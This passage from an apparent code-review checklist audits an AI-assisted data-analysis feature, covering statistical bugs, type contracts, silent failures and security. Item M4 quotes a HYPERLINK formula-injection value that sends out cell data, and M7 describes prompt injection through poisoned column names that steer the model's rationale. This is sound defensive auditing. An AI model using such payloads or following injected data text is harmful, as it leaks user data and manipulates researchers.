- [ ] **I2.6** The AI can see what the user has already changed. **Known to fail**:
      `buildContextBundle` accepts `recentEdits` (`lib/data-analysis/ai/spec-author.ts:294`)
      and the route leaves it empty citing "no producer" (`route.ts:305-315`) — while the
      producer exists at `lib/data-analysis/workspace/edit-history.ts`, held in state at
      `data-analysis-workspace.tsx:1498`.
- [ ] **I2.7** The AI can see the computed result. **Known to fail** and **structural**:
      `SpecAuthorContext.result` (`spec-author.ts:297`) is always undefined because the
      engine result never leaves the browser. This is why the numeric-claim gate at
      `route.ts:370-382` has to be a blunt regex.
- [ ] **I2.8** History, once added, is bounded. Reuse `checkHistory`
      (`lib/limits/guards.ts`) as `/api/agent/run` does, rather than inventing a bound.
- [ ] **I2.9** After a plot is generated, the next action is discoverable without
      guessing.
- [ ] **I2.10** An in-flight AI request can be cancelled, and starting a second one
      does not leave the first to land later and overwrite state.

### I3. Provenance and reproducibility

- [ ] **I3.1** Reopening a saved analysis reproduces the stored numbers exactly, or says
      loudly that it cannot (`ReopenBanner`, `workspace-guards.ts`).
- [ ] **I3.2** `spec_hash` and `data_version_hash` are checked on reopen and a mismatch
      is surfaced, not logged.
- [ ] **I3.3** The provenance card is reachable in the running app. **Known to fail**:
      `components/data-analysis/workspace/provenance-panel.tsx` is one of six orphaned
      components rooted at `workspace-preview.tsx` (~2,351 lines), stranded when
      `/data-analysis/preview` became a redirect
      (`app/(app)/data-analysis/preview/page.tsx:11-13`). The analysis header with the
      revision and save state (`analysis-header.tsx`) is orphaned with it.
- [ ] **I3.4** An exported figure can be traced to the exact data version, spec, engine
      version, and exclusion set that produced it.
- [ ] **I3.5** The figure legend and methods sentence are generated from computed values
      (`lib/data-analysis/provenance.ts`) and name the test that ran.

---

## R. Domain workflow defects

- [ ] **R1** The researcher can choose the statistical test and the multiple-comparison
      correction on the path that produces the audit trail. **VERIFIED TO FAIL, and this
      is the most consequential domain finding.** `statTest`, `statPostHoc`, `statAlpha`,
      `statTails` and `statReferenceLevel` exist as state at
      `data-analysis-workspace.tsx:739-743`, are serialized at `:810` and restored at
      `:1716` — and **no setter is ever called from any UI control**; `setStatTest` appears
      nowhere but its own declaration. On the governed spec path the test is **derived
      from the chart type** (`lib/data-analysis/workspace/chart-state-spec.ts:174-209`),
      or set by a template or an AI patch. The one path that produces the provenance
      record is the one path where the researcher cannot pick their own test. This also
      blocks N11: there is currently nowhere to select BH-FDR even if it existed.
- [ ] **R2** An exclusion records the parameter it was actually given.
      **VERIFIED TO FAIL**, `workspace/exclusion-dialog.tsx:103-105`:
      `method: { name: method, params: { Q: Number(q) / 100 } }` writes a `Q`-keyed
      parameter **regardless of method**, while the label at `:240` switches to "α (%)"
      when Grubbs is selected. A Grubbs exclusion at α = 5% persists as
      `{name: "Grubbs", params: {Q: 0.05}}`. The method name is right and the parameter
      key is wrong, and it lands in the append-only `analysis_revisions` record. This is
      an integrity defect inside the strongest, most deliberately governed part of the
      feature, which is exactly where it is least expected and most costly.
- [ ] **R3** The exclusion dialog offers only methods that exist. **Confirmed to fail**:
      `exclusion-dialog.tsx:234` offers **ROUT**, and nothing in the codebase computes
      ROUT. Only Grubbs is implemented, in `statistics.ts`.
- [ ] **R4** A flagged outlier can be carried into the governed exclusion flow without
      retyping. **Confirmed to fail**: Grubbs runs in `stats-panel.tsx:199-209`, the
      governed dialog lives in the workspace at `:1994-2045`, and the two are
      unconnected. The one workflow that would justify the governance machinery is
      entirely manual.
- [ ] **R5** Rebinding an axis carries or converts its unit. **Confirmed to fail**:
      `setXUnit("")` at `data-analysis-workspace.tsx:1221-1222` and `:2791-2792` discards
      the unit on rebind. Units are therefore not merely decorative but lossy.
- [ ] **R6** Error-bar mode handling is exhaustive. `errorMode as "sd" | "sem" | "ci95"`
      at `:1120` casts away the exhaustiveness check over all nine declared modes.
      Same class as Q5.
- [ ] **R7** Group `n` reaches the figure. `aggregateByX` computes group n at
      `:218-253` and then discards it, so n cannot be annotated on the plot.
- [ ] **R8** Reproducibility is stronger than the rest of this document implies, and this
      is worth recording so it is not weakened. The reopen drift check runs against the
      **live source file**, not the stored copy (`:2260-2263`), and surfaces an explicit
      keep-stored-versus-recompute choice (`:3353`). IQR and MAD error bars are correctly
      drawn around the **median**, not the mean (`plotly-adapter.ts:248-250`). All 15
      declared `FitModel` members are offered in the Standard curve UI
      (`standard-curve-panel.tsx:12-27`). Note that the persistence defect in
      "Read this before anything else" makes this sound design non-functional in
      production.

---

## Q. Type-level contract integrity

**Baseline: `pnpm typecheck` and `pnpm lint` both exit 0 for this scope**, verified by
direct run. That is the shape of the problem. Nothing in this section is a compiler or
lint failure. Every item is a runtime contract risk the compiler is structurally blind
to, because each boundary is made of `unknown`, `as X`, and untyped object literals
instead of one shared type.

- [ ] **Q1** The Catalyst response is validated, not asserted.
      **Confirmed to fail, highest blast radius**: `lib/catalyst-client.ts:174` does
      `return (await res.json()) as TResp` inside the one generic function every Catalyst
      call in the app routes through. Catalyst is a separate service in `../AI` with its
      own deploy cycle and its own type checker, and nothing links the two. A renamed
      field there compiles clean here and arrives as `undefined` at the property access.
- [ ] **Q2** The spec-author success response carries a discriminant.
      **Confirmed to fail**: `route.ts:484` returns the bare patch object. There are
      **12 response literals across 8 distinct shapes** in that one file, none sharing a
      declared type. One of them, the `refused` case at `:283`, omits an explicit status
      and therefore returns **HTTP 200** unlike every sibling error outcome.
- [ ] **Q3** Client and server share one response type. **Confirmed to fail**, and the
      failure mode is concrete: the client switches on four outcomes
      (`spec-author-client.ts:106-116`), falls through everything else, and then
      unconditionally treats any 200 as a patch. Add a new server outcome such as
      `rate-limited` and forget the client case, and `pnpm typecheck` stays green on both
      sides while the UI renders an empty, rationale-less success card for what was
      actually a refusal the researcher never sees.
- [ ] **Q4** No zod-parsed value is re-cast to a hand-written type.
      **Confirmed to fail**: `mutation-schema.ts:149` does `result.data as SpecMutation`,
      asserting that the `z.infer` type equals the separately hand-written `SpecMutation`
      in `mutations.ts`, with no compiler check that they still match. The file's own
      comment at `:76-82` names this drift risk in the abstract. Fix is mechanical:
      define `SpecMutation = z.infer<typeof SpecMutationSchema>` once where the schema
      lives, and the cast disappears.
      Runtime consequence if it drifts: `describeMutation` (`mutations.ts:171`) renders
      the literal string `"Test changed to undefined"` into the proposal-review UI, shown
      to the researcher as a real proposed change.
- [ ] **Q5** Every switch over a mutation kind or an outcome has an explicit
      `default: assertNever(x)`. **Confirmed to fail**: there are **zero** exhaustiveness
      helpers anywhere in the feature. `describeMutation` and `aiNotice` rely on the
      implicit "every branch returns a string" form, which stops protecting anything the
      moment a return type widens to include `undefined`, and which names no missing
      variant when it does fire.
- [ ] **Q6** `applyMutation`'s `default` distinguishes an unknown external kind from a
      forgotten internal branch. Today both are the same silent no-op
      (`mutations.ts:401`). The default itself should stay, since it was a deliberate fix
      for a real crash on older `.n9a` files, but it should log in development when the
      kind it swallowed *is* a current `SpecMutation["kind"]`.
- [ ] **Q7** File-import boundaries validate more than "is an object".
      **Confirmed to fail** at `workspace-guards.ts:371`
      (`parsed.workbook as UniverWorkbookSnapshot`, gated only by `isRecord`, on a `.n9a`
      path where the bytes are user-controlled) and `:473`
      (`entry as unknown as AppliedMutation`, a double cast validating only `origin`
      while `at` and `description` are required strings). An older or hand-edited `.n9a`
      yields `description: undefined`, which throws on any `.slice()` in the history list,
      and `new Date(undefined)` sorts as `Invalid Date`. The doc comments in that same
      file record that this exact class of bug already happened once for a sibling field.
- [ ] **Q8** An outage-flavoured response is reachable only from an actual outage.
      **Confirmed to fail**: the outer catch at `route.ts:485-494` returns
      `{outcome: "unavailable"}` with HTTP 503 for both a genuine upstream failure and a
      malformed-cell bug in the client's own payload, which will fail identically on
      every retry. This is the precise failure the file's own ADR-004 comment says it
      exists to prevent for Catalyst's 4xx responses.
- [ ] **Q9** The request's abort signal reaches every outbound call.
      **Confirmed to fail**: `route.ts` never reads `req.signal`, and the `ask` closure
      calls `callCatalyst` with no `options.signal`, even though `callCatalyst`
      (`lib/catalyst-client.ts:139-143`) supports and forwards one. A client that aborts
      stops only its own fetch; the route keeps running to completion, including a
      possible full repair round, and discards the result.
- [ ] **Q10** The engine compute can be cancelled. **Confirmed to fail**: `ComputeOptions`
      has no `signal` field at all, only the 120-second hard deadline. In a live-editing
      chart tool, editing the spec mid-compute cannot cancel the stale run, which holds
      the single worker thread until it finishes or times out.
- [ ] **Q11** The `unauthorized` variant is discriminated the same way as its siblings.
      **Confirmed to fail**: it is detected by `res.status === 401` above the switch,
      while the declared type presents it as a normal `outcome`-keyed member. Two
      discrimination strategies for one union.
- [ ] **Q12** `{error: "Unauthorized"}` is spelled once. It appears independently at
      `route.ts:215` and `:293`, plus the equivalent in `templates/route.ts`.

The type to introduce, named precisely so this does not get re-designed: a
`SpecAuthorResponse` discriminated union in a new
`lib/data-analysis/ai/spec-author-contract.ts`, built by wrapping the existing zod
`SpecPatchProposal` into the six server-originated variants keyed on `outcome`. Server
and client are the same Next app, so there is no legitimate reason for two declarations
here, unlike the Notes9-to-Catalyst boundary where a mirrored copy is defensible.
The client-only `error` and `aborted` variants layer on top and stay client-side.
Typing the route's return value forces Q2 to be fixed as a consequence rather than as a
separate manual step.

Recorded as the correct pattern, so it is not "fixed": `analysis-spec.ts:636` casts to
peek `schemaVersion` and then immediately re-validates through `parseSpec`.
Cast-then-revalidate is safe. The problem sites are the ones using the cast *as* the
validation. The non-null assertions in `engine/resolver.ts:581-685` follow a `.set()` in
the same scope and are internal invariants, not boundary crossings.

---

## O. Silent failures

Ranked by "could this put a wrong number in a paper".

- [ ] **O1** A pasteable figure legend never asserts that a test ran when it did not.
      **VERIFIED IN SOURCE, and this is the most serious finding in the review.**
      `notes9_engine.py:514-516` (two-way ANOVA) and `:554-556` (mixed effects) return,
      when statsmodels is unavailable in the Pyodide session, a **normal successful
      `TestResult`** whose `test` field is `"Two-way ANOVA"` and whose every statistic is
      `null`. It is not routed through `EngineResult.error`, so the error banner at
      `results-card.tsx:396` never fires. Then `draftFigureLegend`
      (`lib/data-analysis/provenance.ts:273-286`) — the text explicitly built to be
      pasted into a paper — never reads `reportSentence`, the only field carrying
      "statsmodels is unavailable in this session". It reads `t.test`, `t.statistic`,
      `t.df`, `t.pValue`. With the statistics null, both formatting branches are skipped
      and the emitted legend is literally **`"Two-way ANOVA, p = n/a."`** A researcher
      copying the auto-drafted legend publishes a claim that a two-way ANOVA was
      performed. Nothing on screen contradicts it.
- [ ] **O2** An AI-applied change never silently reverts.
      **Confirmed to fail**: `data-analysis-workspace.tsx:803-830`. If replaying the AI
      overlay onto the current rail spec fails `parseSpec`, the derivation falls back to
      the rail spec, dropping every AI mutation with no rail control behind it, which
      includes point exclusions and annotations. No banner, no diff, no undo prompt. The
      chart then looks like the user's own settings. Scenario: the AI excludes three
      outliers, a later rail edit changes the spec shape, the exclusions vanish, and the
      next p-value silently includes the outliers again. The outer `catch { return null }`
      additionally swallows any exception with no `console.error` and no telemetry.
- [ ] **O3** A non-converged curve fit degrades rather than crashing.
      **Confirmed to fail, loudly.** `run_dose_response` returns a `CurveFitResult`
      missing every field the TypeScript interface declares required
      (`engine/contract.ts:194-214`). Nothing validates the shape at the worker boundary;
      `checkResultIntegrity` checks version and hash staleness only. Then
      `provenance.ts:317-323` reads `f.parameters.ec50` and `results-card.tsx:199-206`
      reads `fit.rSquared.toFixed(4)`, both unguarded. There is **no
      `app/(app)/data-analysis/error.tsx`**, so the throw reaches `app/global-error.tsx`
      and replaces the entire application with "Something went wrong". A noisy real-world
      dose-response curve that fails to converge is an ordinary event, not an edge case.
      Ranked below O1 and O2 because nothing wrong gets published: the failure is
      maximally loud, just disproportionately destructive.
- [ ] **O4** An off-contract AI reply is distinguishable from "no changes needed".
      **Confirmed to fail**: `spec-author-client.ts:126-137` falls through to the success
      path for any `res.ok` reply whose `outcome` matches no known variant, defaulting
      `mutations: []`. `aiNotice` returns `null` for `patch`
      (`workspace/spec-prompt.ts:311-315`), and the UI then renders "Nothing needed
      changing, the figure already matches" (`data-analysis-workspace.tsx:3201`). A real
      backend contract break produces the same reassuring sentence as a legitimate no-op
      and could go undetected indefinitely. No mutation is applied, so nothing is
      published wrong; the cost is that a broken wire is invisible.
- [ ] **O5** Every object crossing the Python engine to TypeScript boundary is validated
      at runtime. **Confirmed absent.** `EngineResult` is cast, not parsed, unlike the AI
      seam which correctly uses `SpecMutationSchema`. This is the root cause of O3.
- [ ] **O6** A crash in the workspace is caught by a route-local error boundary.
      **Confirmed to fail**: no `app/(app)/data-analysis/error.tsx` exists, though
      thirteen other routes in the app have one.

Judged and cleared as **correct** fail-open design, recorded so they are not
re-litigated: the `spec-author` route's every-branch-returns-a-legible-body contract;
`applyMutation`'s `default` case at `spec/mutations.ts:401`, which was a deliberate fix
for a historical crash; the templates 503 branch, because its one caller
(`templates-dialog.tsx:73-92`) checks `res.ok` and falls back to a distinct local mode
rather than trusting the empty array; the 120-second dead-worker timeout; and the
`_scrub`/`_nan_to_none` NaN handling, which correctly stops NaN reaching the client.

---

## P. Render correctness and performance

- [ ] **P1** No non-null assertion defeats the deliberate null-safety in spec derivation.
      **Confirmed to fail**: `data-analysis-workspace.tsx:3330` passes
      `spec: derivedSpec!` to `PipelineTabs`, while the `useMemo` producing it
      (`:803-838`) has an explicit try/catch precisely because it can legitimately return
      null. The one place the codebase guards against a failed derivation is the one
      place the guard is asserted away. It is the only `derivedSpec!` in the file.
- [ ] **P2** Typing in any rail input does not re-render the whole feature.
      **Confirmed to fail**: there is **zero `React.memo`** anywhere in
      `components/data-analysis/**` or `components/catalyst/catalyst-section-hero.tsx`,
      and all state lives in the one 3,941-line component. Every keystroke in the AI
      prompt, a chart title, or the stats μ₀ field reconciles the entire tree. The data
      computations are correctly `useMemo`-gated and are not the bottleneck; the
      reconciliation is.
- [ ] **P3** Staying on the Files tab does not boot Pyodide. **Confirmed to fail**:
      `data-hub.tsx:60` hides the workspace with `className="hidden"` rather than
      unmounting, the workspace seeds ELISA demo data on mount so `specTable` is
      immediately non-empty, and the debounce effect at `:917-948` fires
      `computeAnalysis` 700 ms later regardless of visibility. A user who never leaves
      Files still pays the full WASM boot. The intended fix, `warmUpEngine`, is dead code
      reachable only from the orphaned `hooks/use-analysis-spec.ts`.
- [ ] **P4** The live chart has an accessible name. **Confirmed to fail and worse than
      section K states**: K1 describes `figure-canvas.tsx:253`, which is the Figure-layout
      phase reached via `LayoutCanvas` at `:3548`. The **primary** Chart phase renders
      `PlotlyChart` at `:2662`, and `plotly-chart.tsx:275-276` has **no `role` and no
      `aria-*` at all**. A screen-reader user reaches a completely unlabelled region
      where the main content of the page lives. Both components are live; fix both.
- [ ] **P5** Submitting a new AI prompt while a proposal is pending warns before
      discarding it. **Confirmed to fail**: `aiReply` and `aiProposal` are single-slot and
      reset at the top of `askForChange`. A user who reads a proposal, gets distracted,
      and types a follow-up loses the un-executed proposal silently.
- [ ] **P6** Clicking a label focuses its control. **Confirmed to fail across the entire
      rail**: both label helpers (`data-analysis-workspace.tsx:3847-3854` `Field`, and
      `stats-panel.tsx:392-394` `Labeled`) render a bare `<label>` with no `htmlFor`, and
      `grep htmlFor` returns zero hits across the workspace, stats panel, standard-curve
      panel, plate view, and export menu. One fix in each helper covers every field.
- [ ] **P7** The exclusion dialog closes on Escape and manages focus. **Confirmed to
      fail** (`workspace/exclusion-dialog.tsx:124-126`): it declares
      `role="dialog" aria-modal="true"` and has no keydown handler, no initial focus, and
      no focus restore. The pattern to copy already exists in this feature at
      `export-menu.tsx:155`.
- [ ] **P8** List keys are stable. Index keys are used at
      `data-analysis-workspace.tsx:3198` and `:3217` (applied and rejected mutations),
      `pipeline-bar.tsx:82` and `:98`, `standard-curve-panel.tsx:209`, and
      `plate-view.tsx:266`. Low risk today since no row holds local state, but the same
      file already uses stable ids two lines away at `pipeline-bar.tsx:114` and `:130`.
- [ ] **P9** The exclusion dialog cannot carry one row's typed reason to another. Add
      `key={exclusionRowId}` at the mount site as a structural guarantee; today it relies
      on the click path always passing through null.

Recorded as correct, for calibration: `plotly-chart.tsx` and `figure-canvas.tsx` both use
`plotly.react()` for incremental updates rather than `newPlot`, sync callbacks through
refs to avoid re-running the draw effect, and clean up ResizeObservers and Plotly
instances on unmount. `workspace/docks.tsx` reads `localStorage` only inside an effect,
which is the SSR-safe pattern. The `AbortController` lifecycle in `askForChange`
(`:1856-1914`) correctly aborts superseded requests and no-ops a stale `finally`. No
`dangerouslySetInnerHTML`, no conditional hook calls across ~50 hook sites, and no direct
state mutation anywhere in the rail or proposal paths.

---

## N. Confirmed statistical defects

These are not "unvalidated" items. Each produces a wrong number today. Verification
status is stated per item: `VERIFIED IN SOURCE` means read directly during this review;
`REPORTED` means a single reviewer's finding with sound reasoning, not yet independently
confirmed.

- [ ] **N1** Curve-fit weighting is inverted. **VERIFIED IN SOURCE**,
      `notes9_engine.py:858-864`. `optimize.curve_fit` minimises `((f-y)/sigma)²`, so the
      effective weight is `1/sigma²`. The code passes `sigma = |Y|` for the `"1/Y"`
      option, which yields weight `1/Y²`, and `sigma = Y²` for the `"1/Y^2"` option,
      which yields weight `1/Y⁴`. Both over-suppress high-response points, shifting the
      fitted EC50/IC50. The correct values are `sigma = sqrt(|Y|)` and `sigma = |Y|`.
      Note that `lib/data-analysis/curve-fitting.ts` implements the same two modes
      **correctly** as direct weights, so the TypeScript and Python paths disagree on
      every weighted fit. This lands squarely on the immunoassay standard-curve path,
      where `1/Y²` weighting is the normal choice because the data is heteroscedastic.
- [ ] **N2** Repeated-measures ANOVA reports a df that does not match its own p-value.
      **VERIFIED IN SOURCE**, `notes9_engine.py:500-511`. When sphericity fails, line 506
      computes `pv` against the Greenhouse-Geisser-corrected `df1*gg, df2*gg`, while
      lines 509 and 511 report and print the **uncorrected** `df1, df2`. The generated
      report sentence therefore reads `F(3, 33) = …, p = …` where p came from
      `F(1.95, 21.45)`. Anyone re-deriving significance from the printed pair gets a
      different answer. The ε is disclosed in a trailing note, so the information is
      recoverable, but the primary reported triple is internally inconsistent.
- [ ] **N3** Dunn's post-hoc silently ignores the correction method the user chose.
      **VERIFIED IN SOURCE**, `notes9_engine.py:460`. `p.get("postHoc", "none") != "none"`
      is read only as a boolean gate; the method string is never forwarded, and `_dunn`
      defaults to Holm. A user who selects Bonferroni, Šidák, or Holm-Šidák receives
      Holm-adjusted p-values with no indication of the substitution. Holm is uniformly
      less conservative than Bonferroni, so pairs reported significant "under Bonferroni"
      may not be.
- [ ] **N4** Multi-group log-rank uses the wrong statistic. **REPORTED**, with a numeric
      example. For k > 2 the code computes `Σ(O-E)²/E`, which ignores the covariance
      between groups' O-E terms. The correct Mantel-Cox generalisation is the quadratic
      form `(O-E)ᵀ V⁻¹ (O-E)` over the `(k-1)×(k-1)` covariance matrix, which is what R's
      `survdiff` and `lifelines` compute. On the reviewer's synthetic three-group
      dataset this gave χ² = 14.69 (p ≈ 0.00065) against a correct χ² = 18.22
      (p ≈ 0.00011). The two-group branch is separate and correct. Verify before fixing.
- [ ] **N5** Kaplan-Meier confidence bands hardcode z = 1.96 regardless of alpha
      (`notes9_engine.py:751-752`), while every other interval in the file routes through
      the `_z(alpha)` helper whose own docstring warns against exactly this. A user who
      sets alpha = 0.01 gets a correct interval everywhere except the survival curve.
- [ ] **N6** The Friedman effect size computes Kendall's W but labels it
      "epsilon-squared". Different statistic, different normalisation. A paper citing the
      printed label cites the wrong name for the number shown.
- [ ] **N7** The "every test carries its assumption checks and its effect size by
      default" claim in the engine docstring is **false for roughly half the tests**.
      Confirmed at the `_result(...)` call sites: `run_wilcoxon` reports neither;
      `run_mixed_effects` reports neither; `run_anova_two_way`, `run_contingency`,
      `run_correlation`, `run_linear_regression`, and the log-rank path all pass an
      explicit empty assumptions list. `run_linear_regression` has no residual normality,
      homoscedasticity, or linearity check at all, which are the three assumptions a
      regression most needs. Log-rank reports no hazard ratio.
- [ ] **N8** A substituted test is reported under the requested test's name.
      `run_anova_rm` falls back to `run_friedman` when statsmodels is unavailable
      (`notes9_engine.py:~484`) without setting `_test_ran`, so the dispatcher
      (`~:1011`) labels the output "anova-rm". This directly contradicts the file's own
      stated principle that "the record names what ran, not what was asked for".
- [ ] **N9** `_clean()` (`notes9_engine.py:52-63`) silently drops non-finite,
      non-numeric, and empty values from every column with no count surfaced anywhere. A
      user who submits 30 rows and has 4 dropped sees an n that does not match what they
      submitted and no explanation.
- [ ] **N10** Mann-Whitney tie correction is missing on the TypeScript side.
      `statistics.ts:433-454` uses variance `n1*n2*(n1+n2+1)/12` with no tie term, while
      scipy applies one. Verified numerically by the reviewer: same U = 6, p = 0.017854
      from scipy against p ≈ 0.018086 from the TypeScript path, diverging further as ties
      increase. Ties are exactly what this test is usually chosen to handle.
      `statistics.ts:456-481` (Wilcoxon signed-rank) has the same gap and reports no
      effect size.
- [ ] **N11** No FDR / Benjamini-Hochberg correction exists in either engine. Only
      Bonferroni, Šidák, Holm, Holm-Šidák, Tukey and Dunnett. FDR is the standard choice
      for the large-comparison-count case, which is exactly the omics and multi-marker
      panel work this ELN targets. Completeness gap, not a correctness bug.
- [ ] **N12** Curve-fit confidence bands use an absolute finite-difference step
      (`eps=1e-6`, `notes9_engine.py:~898`) rather than one scaled per parameter, unlike
      the TypeScript equivalent. For a parameter of large magnitude, such as an EC50
      expressed in nM, the step is far below the scale at which the gradient is
      meaningful, producing a noisy confidence band.
- [ ] **N13** `run_contingency`'s small-expected-cell rule flags "unreliable" when **any**
      cell is below 5, rather than applying Cochran's rule for tables larger than 2×2 (at
      most 20% of cells below 5, none below 1). It over-fires on usable R×C tables, which
      trains users to ignore the warning.
- [ ] **N14** Every user-selectable option has its own golden-value test, not just the
      default. Both N1 and N3 are defects in a non-default option, and both would have
      been caught by this rule.
- [ ] **N15** `grep` for the literal `1.96` in `notes9_engine.py` returns zero hits (N5).

Verified correct and worth recording so they are not re-litigated: Kaplan-Meier's
Greenwood variance, at-risk sets, censoring and median definition; the two-group
Mantel-Haenszel log-rank branch; Dunn's rank sums and tie-correction term (the bug is
only the method pass-through); Mauchly's Helmert contrasts, bias correction and df;
the specific `(RuntimeError, ValueError)` catch and `pcov` finiteness check on
dose-response, which correctly suppress a fabricated confidence interval on a failed
fit; the Haldane-Anscombe correction on zero contingency cells; and the guards on CV,
skewness, kurtosis, geometric mean and Hedges' g. No bare `except: pass` was found
anywhere in the file.

---

## M. Security

Ranked by exploitability, highest first.

- [ ] **M1** `/api/data-analysis/spec-author` bounds the `table` payload.
      **Confirmed to fail**, and reachable today by any authenticated user posting
      directly to the endpoint. `route.ts:252-268` checks only that `columns` and `rows`
      are non-empty arrays. The route then does at least two full `O(rows × columns)`
      passes before it ever calls Catalyst: `profileTable` inside `toDataProfile`
      (`route.ts:105-121`) and a per-numeric-column re-scan in `numericSummary`
      (`route.ts:84-99`), each allocating fresh arrays. The route imports none of
      `lib/limits/guards.ts`. Note also that Next's `serverActions.bodySizeLimit` in
      `next.config.mjs:39` governs Server Actions only, not Route Handlers, so it does
      not cap this.
- [ ] **M2** `LIMITS_MODE` is set to `enforce` in the deployed environment.
      **Unverified and environment-dependent.** `lib/limits/config.ts` defaults to
      shadow mode, which is non-blocking, so even the routes that *do* import the guards
      may not actually be enforcing them. Confirm at deploy.
- [ ] **M3** File-parsing dependencies on the untrusted-upload path carry no open CVEs.
      **Confirmed to fail**: `package.json:167` pins `xlsx@^0.18.5`, which is subject to
      prototype pollution (CVE-2023-30533) and a ReDoS in `.xls`/CSV number parsing.
      SheetJS ships fixes from its own CDN and no longer publishes to npm, so
      `^0.18.5` can **never** resolve to a patched build. `lib/spreadsheet-workbook.ts:68`
      calls `XLSX.read` directly on uploaded bytes. Because uploaded files are browsable
      across projects, a malicious workbook opened by a collaborator executes the
      vulnerable parse in *their* browser. Fix by installing from
      `https://cdn.sheetjs.com/...` or moving to a maintained parser.
- [ ] **M4** Exported spreadsheet cells are neutralised against formula injection.
      **Confirmed to fail**: the stats export builds from raw uploaded `table.rows` via
      `XLSX.utils.aoa_to_sheet` with no escaping of cells beginning `=`, `+`, `-`, or
      `@` (`data-analysis-workspace.tsx` around `1387-1466` and `3073-3092`). A cell
      containing `=HYPERLINK("http://…"&A1,"open")` survives into the exported workbook.
      DDE is blocked by default in modern Excel; `HYPERLINK` and `WEBSERVICE`-style
      exfiltration formulas are not. Standard fix is a leading apostrophe on write.
- [ ] **M5** The app sets a Content-Security-Policy. **Confirmed absent** — no CSP
      anywhere in the repo, and no `headers()` block in `next.config.mjs`. Broader than
      this feature, but it is what makes M6 unbounded.
- [ ] **M6** Third-party runtime scripts are self-hosted or CSP-constrained.
      **Confirmed to fail**: `lib/data-analysis/engine/contract.ts:66-68` defaults
      Pyodide to `cdn.jsdelivr.net` and `engine/worker.ts:78` loads it via
      `self.importScripts`, which has no `integrity=` equivalent. The Python sandbox
      argument does not cover this: the boot-time JS is unauthenticated third-party code
      running in a same-origin worker that shares the page's cookie jar, so a CDN
      compromise becomes a same-session API-abuse primitive, not merely wrong statistics.
      The fix is a config change, not a rewrite: `NEXT_PUBLIC_PYODIDE_BASE_URL` already
      supports self-hosting, and `public/pyodide/` already exists (see A2 for the version
      mismatch that must be fixed at the same time).
- [ ] **M7** Data-derived strings are framed as untrusted in the model prompt.
      **Partial gap**: `buildContextBundle` (`lib/data-analysis/ai/spec-author.ts:257-301`)
      forwards `fileName`, every column name, and up to 20 category levels per column
      verbatim. `screenRequest` (`:169-194`) screens only the human-typed prompt. Blast
      radius is well contained by the typed-mutation gate, and model free text is rendered
      as plain React text (`data-analysis-workspace.tsx:3194`) so it cannot become XSS,
      but a poisoned column name can still steer a `rationale` that socially engineers the
      researcher into doing manually what the model is forbidden from doing.
- [ ] **M8** The JWT path verifies rather than decodes. **Passing**:
      `lib/auth/verify-token.ts` uses `jose.jwtVerify` with HS256 pinned against
      `SUPABASE_JWT_SECRET`, and `jose` checks `exp`/`nbf` by default. `aud` and `iss`
      are not asserted, which is worth adding as defence in depth but is not a bypass.
- [ ] **M9** Model output cannot bypass the typed-mutation schema. **Passing**:
      `ALLOWED_MUTATION_KINDS` plus `parseMutation` plus the server-computed
      `offerableTests` legality check. Data exclusion, bracket placement, and caption
      wording are structurally unavailable to the model via
      `FORBIDDEN_MUTATION_KINDS`, not merely discouraged in prose. This is the part of
      the design that is doing the heavy lifting correctly.
- [ ] **M10** Raw data rows never cross to Catalyst. **Passing**, and enforced by the
      bundle's shape rather than by convention.
- [ ] **M11** Stored user JSON never reaches `eval`, `Function()`,
      `dangerouslySetInnerHTML`, or an unvalidated `fetch`. **Passing**: template
      `config` is read back through typed setters with per-field guards, and there is no
      template-sharing feature, so a malicious config is self-inflicted only. Add write
      validation anyway before any sharing feature lands.
- [ ] **M12** Missing org scoping on `app/api/data-analysis/**` is safe. **Passing for
      now**: every object in the request body is data the calling browser already
      legitimately held, and the route performs no server-side fetch keyed by a
      client-supplied id. This becomes a real gap the moment such a fetch is added.

---

## L. Persistence, tenancy, and reproducibility

All verified against the live database on 2026-08-14 unless marked otherwise.

- [ ] **L1** The live `analyses` schema matches the schema the application code targets.
      **Confirmed to fail.** See "Read this before anything else".
- [ ] **L2** `scripts/` contains no two migrations declaring the same table with
      different shapes. **Confirmed to fail**: `105_saved_analyses.sql` and
      `106_analyses.sql` both declare `public.analyses`.
- [ ] **L3** Every migration in `scripts/` is recorded in `public.schema_migrations`.
      **Confirmed to fail** for `103_data_analysis_templates.sql`,
      `105_saved_analyses.sql`, and `106_analyses.sql`, all of which created live objects
      without a ledger entry.
- [ ] **L4** `analysis_revisions` is append-only at the database level.
      **Passing** and well done: RLS is on with a SELECT-only policy and no INSERT,
      UPDATE, or DELETE policy, so immutability is a database guarantee rather than a
      convention.
- [ ] **L5** No SECURITY DEFINER function in this feature is callable by `anon`.
      **Passing**: `commit_analysis_revision` and `freeze_analysis_revision` both check
      `auth.uid()`, do a manual ownership or project-membership check, and grant EXECUTE
      to `authenticated` only.
- [ ] **L6** `data_analysis_templates` RLS covers all four verbs, owner-scoped.
      **Passing.**
- [ ] **L7** `experiment_data` has one coherent RLS model. **Confirmed to fail**: nine
      policies from three generations coexist on the live table, including a
      project-member set, an org-scoped `experiment_data_all`, and an older
      "Users can ..." set. Permissive policies OR together, so this is not a hole, but
      there is no single answer to who can read a data file.
- [ ] **L8** The `experiment_data` query supporting the Data page is indexed.
      **Confirmed to fail**: live indexes are on `id`, `experiment_id`, `project_id`, and
      a partial one on `tabular_format`. There is **no index on `created_at`**, which is
      the sort key of the unfiltered `order by created_at desc limit 500` at
      `app/(app)/data-analysis/page.tsx:19-31`. Only 72 rows live today, so this is a
      latent problem, not a current one. Re-check with `EXPLAIN ANALYZE` before volume
      grows.
- [ ] **L9** The 500-row cap is disclosed to the user. **Confirmed to fail**: there is no
      count, no pagination, and no truncation indicator, while
      `components/data-analysis/data-files-list.tsx:326` tells the user it shows
      "Every data file across your experiments".
- [ ] **L10** Autosave is debounced. **Passing**: 800 ms trailing debounce with
      `clearTimeout` on every dependency change
      (`data-analysis-workspace.tsx:2613-2632`).
- [ ] **L11** Autosave lives in one place. **Confirmed to fail**: `hooks/use-analysis-spec.ts`
      is documented as owning autosave and has **no callers anywhere in the app**; the
      live logic is duplicated inline in the workspace component. This same orphaned hook
      is also the reason no engine warm-up runs (see A10), and it is a trap for anyone
      briefing a change to autosave.
- [ ] **L12** Two tabs editing one analysis cannot silently clobber each other.
      **Confirmed to fail**: `saveDraft` is a plain UPDATE with no optimistic-concurrency
      guard, and there is no Realtime subscription on `analyses`. Last write wins and
      neither tab is told. (Currently masked by L1, since no write succeeds at all.)
- [ ] **L13** Uploaded data files use signed URLs and never public URLs.
      **Passing**: upload stores the storage path in `experiment_data.file_url`, and
